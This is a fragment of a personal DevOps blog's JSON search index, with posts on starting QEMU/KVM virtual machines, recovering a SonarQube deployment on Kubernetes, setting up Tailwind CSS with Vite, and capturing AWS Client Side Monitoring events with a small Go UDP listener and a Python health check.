operating system running. You can always go back to the monitor console with Ctrl+Opt+1 Use the UEFI to launch 1qemu-system-aarch64 \\ 2 -nodefaults \\ 3 -machine virt,accel=hvf \\ 4 -cpu host \\ 5 -chardev vc,id=monitor \\ 6 -mon monitor \\ 7 -serial vc \\ 8 -bios /opt/homebrew/share/qemu/edk2-aarch64-code.fd Install require packages 1# check the BIOS is enabled virtualization 2egrep --color \u0026#39;vmx|svm\u0026#39; /proc/cpuinfo 3 4echo \u0026#34; Upgrade the system\u0026#34; 5sudo apt-get update \u0026amp;\u0026amp; sudo apt-get -y upgrade || apt-get -y install sudo \u0026amp;\u0026amp; sudo apt-get update \u0026amp;\u0026amp; sudo apt-get -y upgrade 6 7echo \u0026#34;Virtualization host installation\u0026#34; 8sudo apt-get -y install qemu-kvm libvirt-bin virtinst virt-viewer libguestfs-tools virt-manager uuid-runtime curl libvirt-dev genisoimage qemu-kvm libyaml-dev 9 10echo \u0026#34;Enable libvirt\u0026#34; 11sudo systemctl restart libvirtd 12sudo virt-host-validate 13 14 15 16# with kvm 17minikube start --vm-driver kvm2 Reference How to run Vms with QEMU Why QEMU ","link":"https://blog.wisekee.com/post/kvm-getting-started/","section":"post","tags":["KVM","Libvirt","Qemu"],"title":"KVM getting started"},{"body":"","link":"https://blog.wisekee.com/tags/libvirt/","section":"tags","tags":null,"title":"Libvirt"},{"body":"","link":"https://blog.wisekee.com/tags/openai/","section":"tags","tags":null,"title":"OpenAI"},{"body":"","link":"https://blog.wisekee.com/tags/qemu/","section":"tags","tags":null,"title":"Qemu"},{"body":"","link":"https://blog.wisekee.com/tags/sonarqube/","section":"tags","tags":null,"title":"sonarqube"},{"body":"The volumen prefere to EBS can speed up the scanning.\nAdjust the resources request and limit 1resources: 2 limits: 3 cpu: \u0026#39;1\u0026#39; 4 memory: 8Gi 5 requests: 6 cpu: 400m 7 memory: 4Gi Change the securityContext to debug the pod and install some tools to check 1securityContext: 2 runAsUser: 0 3 runAsGroup: 0 Mount the sonar.properties to specific the java launch parameters the mount and volumes 1volumes: 2 - name: sonarqube-config 3 configMap: 4 name: sonarqube-sonarqube-config 5 defaultMode: 420 6volumeMounts: 7- name: sonarqube-config 8 mountPath: /opt/sonarqube/conf the configmap 1apiVersion: v1 2kind: ConfigMap 3metadata: 4 name: sonarqube-sonarqube-config 5 namespace: sonarqube 6data: 7 sonar.properties: \u0026gt;- 8 sonar.web.javaAdditionalOpts=-Xmx2G 9 10 sonar.ce.javaAdditionalOpts=-Xmx4G -XX:+HeapDumpOnOutOfMemoryError 11 12 sonar.search.javaAdditionalOpts=-Xmx4G -Xms4G 13 -XX:+HeapDumpOnOutOfMemoryError -Dnode.store.allow_mmap=false Delete the es data and relaunch the sonarqube to reindex data 1rm -rf /opt/sonarqube/data/es7 2rm -rf /opt/sonarqube/logs 3rm -rf /opt/sonarqube/temp ","link":"https://blog.wisekee.com/post/sonarquebe-recovery/","section":"post","tags":["sonarqube","es","k8s"],"title":"Sonarqube recovery from failed"},{"body":"","link":"https://blog.wisekee.com/tags/tailwindcss/","section":"tags","tags":null,"title":"tailwindcss"},{"body":"Initialization the project 1mkdir tailwind 2cd tailwind 3pnpm create vite@latest my-project -- --template vue 4pnpm install -D tailwindcss postcss autoprefixer 5# this will create a `tailwind.config.js` `postcss.config.js` 6pnpm tailwindcss init -p 7pnpm run dev config the tailwind css project add the package to src/style.css 1@tailwind base; 2@tailwind components; 3@tailwind utilities; config the postcss.config.js 1export default { 2 plugins: { 3 tailwindcss: {}, 4 autoprefixer: {}, 5 }, 6} config the tailwind.config.js 1/** @type {import(\u0026#39;tailwindcss\u0026#39;).Config} */ 2export default { 3 content: [ 4 \u0026#34;./index.html\u0026#34;, 5 \u0026#34;./src/**/*.{vue,js,ts,jsx,tsx}\u0026#34;, 6 ], 7 theme: { 8 extend: {}, 9 }, 10 plugins: [], 11} ","link":"https://blog.wisekee.com/post/tailwindcss-getting-started/","section":"post","tags":["css","tailwindcss","frontend"],"title":"Tailwindcss getting started"},{"body":"Enable the aws CSM for application specific the following Environment Variables 1export AWS_CSM_ENABLED=true # or config the `~/.aws/config` include `csm_enabled = true` 2export AWS_CSM_HOST=10.0.0.1 # to send message to udp host 3export AWS_CSM_PORT=31000 # the CSM host port to listener 4export AWS_CSM_CLIENT_ID=appName # to set an identifier to differentiate multiple processes you might have configured to send to the same listener. Receive the message from client in local testing 1nc -luv localhost 31000 Receive the message from client use go code 1package main 2 3import ( 4\t\u0026#34;encoding/json\u0026#34; 5\t\u0026#34;fmt\u0026#34; 6\t\u0026#34;log\u0026#34; 7\t\u0026#34;net\u0026#34; 8\t\u0026#34;os\u0026#34; 9\t\u0026#34;os/signal\u0026#34; 10\t\u0026#34;runtime\u0026#34; 11\t\u0026#34;strconv\u0026#34; 12\t\u0026#34;strings\u0026#34; 13\t\u0026#34;syscall\u0026#34; 14) 15 16// ActionMessage is a struct representing a message from CSM 17type ActionMessage struct { 18\tVersion int `json:\u0026#34;Version\u0026#34;` 19\tClientID string `json:\u0026#34;ClientId\u0026#34;` 20\tType string `json:\u0026#34;Type\u0026#34;` 21\tService string `json:\u0026#34;Service\u0026#34;` 22\tAction string `json:\u0026#34;Api\u0026#34;` 23\tTimestamp int `json:\u0026#34;Timestamp\u0026#34;` 24\tAttemptLatency int `json:\u0026#34;AttemptLatency\u0026#34;` 25\tFqdn string `json:\u0026#34;Fqdn\u0026#34;` 26\tUserAgent string `json:\u0026#34;UserAgent\u0026#34;` 27\tAccessKey string `json:\u0026#34;AccessKey\u0026#34;` 28\tRegion string `json:\u0026#34;Region\u0026#34;` 29\tHTTPStatusCode int `json:\u0026#34;HttpStatusCode\u0026#34;` 30\tFinalHTTPStatusCode int `json:\u0026#34;FinalHttpStatusCode\u0026#34;` 31\tXAmzRequestID string `json:\u0026#34;XAmzRequestId\u0026#34;` 32\tXAmzID2 string `json:\u0026#34;XAmzId2\u0026#34;` 33} 34 35func listen(connection *net.UDPConn, quit chan struct{}) { 36\tbuffer := make([]byte, 4096) 37\tn, _, err := 0, new(net.UDPAddr), error(nil) 38\tvar message ActionMessage 39\tfor err == nil { 40\tn, _, err = connection.ReadFromUDP(buffer) 41\terr := json.Unmarshal(buffer[:n], \u0026amp;message) 42\tif err != nil { 43\tlog.Println(err) 44\t} 45\t//Each action taken sends two json messages. The first has a type of \u0026#34;ApiCallAttempt\u0026#34; this filters for the API call itself 46\tif message.Type == \u0026#34;ApiCall\u0026#34; { 47\tfmt.Println(strings.ToLower(message.Service) + \u0026#34;:\u0026#34; + message.Action) 48\t} 49\t} 50\tfmt.Println(\u0026#34;listener failed - \u0026#34;, err) 51\tquit \u0026lt;- struct{}{} 52} 53 54//SetupCloseHandler Displays a message when the user closes the program 55func SetupCloseHandler() { 56\tc := make(chan os.Signal) 57\tsignal.Notify(c, os.Interrupt, syscall.SIGTERM) 58\tgo func() { 59\t\u0026lt;-c 60\tfmt.Println(\u0026#34;\\rCtrl+C pressed, Stopping...\u0026#34;) 61\tos.Exit(0) 62\t}() 63} 64 65func main() { 66 67\tvar port = 31000 68\tvar err error 69\tvar addr = net.UDPAddr{ 70\tPort: port, 71\tIP: net.IP{127, 0, 0, 1}, 72\t} 73\tif os.Getenv(\u0026#34;AWS_CSM_PORT\u0026#34;) != \u0026#34;\u0026#34; { 74\tport, err = strconv.Atoi(os.Getenv(\u0026#34;AWS_CSM_PORT\u0026#34;)) 75\tif err != nil { 76\tfmt.Println(\u0026#34;Could not parse value of AWS_CSM_PORT Exiting...\u0026#34;) 77\tos.Exit(1) 78\t} 79\t} 80\tif os.Getenv(\u0026#34;IN_DOCKER\u0026#34;) == \u0026#34;True\u0026#34; { 81\taddr = net.UDPAddr{ 82\tPort: port, 83\tIP: net.IP{0, 0, 0, 0}, 84\t} 85\t} 86\tconnection, err := net.ListenUDP(\u0026#34;udp\u0026#34;, \u0026amp;addr) 87\tif err != nil { 88\tfmt.Println(\u0026#34;Could not start Action hero on the specified port, Exiting...\u0026#34;) 89\tos.Exit(1) 90\t} 91\tfmt.Println(\u0026#34;Action Hero Starting...\u0026#34;) 92\tSetupCloseHandler() 93\tquit := make(chan struct{}) 94\tfor i := 0; i \u0026lt; runtime.NumCPU(); i++ { 95\tgo listen(connection, quit) 96\t} 97\t\u0026lt;-quit // hang until an error 98} Make a dockerfile 1FROM scratch 2COPY actionhero / 3EXPOSE 31000/udp 4ENTRYPOINT [\u0026#34;/actionhero\u0026#34;] Health check for udp 1#!/usr/local/bin/python 2 3import enet 4import random 5import sys 6import os 7import signal 8 9udp_socket_port=int(os.environ.get(\u0026#39;UDP_SOCKET_PORT\u0026#39;)) 10udp_socket_ip=os.environ.get(\u0026#39;UDP_SOCKET_IP\u0026#39;).encode(\u0026#39;utf-8\u0026#39;) 11print(\u0026#34;checking health of udp endpoint %s %s\u0026#34; %(udp_socket_ip,udp_socket_port)) 12 13host = enet.Host(None, 1, 0, 0) 14addr=enet.Address(udp_socket_ip,udp_socket_port) 15peer = host.connect(addr,1) 16if peer: 17 print(\u0026#34;%s:\u0026#34; % peer) 18 event = host.service(1000) 19 if event.type == enet.EVENT_TYPE_CONNECT: 20 print(\u0026#34;%s: CONNECT\u0026#34; % event.peer.address) 21 elif event.type == enet.EVENT_TYPE_DISCONNECT: 22 print(\u0026#34;%s: DISCONNECT\u0026#34; % event.peer.address) 23 os.system(\u0026#34;while true; do pkill nginx;sleep 1;done\u0026#34;) 24 print (\u0026#34;sidecar NGINX process stopped successfully\u0026#34;) Reference client_side_monitoring actionhero ","link":"https://blog.wisekee.com/post/aws-client-side-monitoring/","section":"post","tags":["CSM","monitoring","AWS"],"title":"Use AWS CSM to monitoring the api call in your service"}]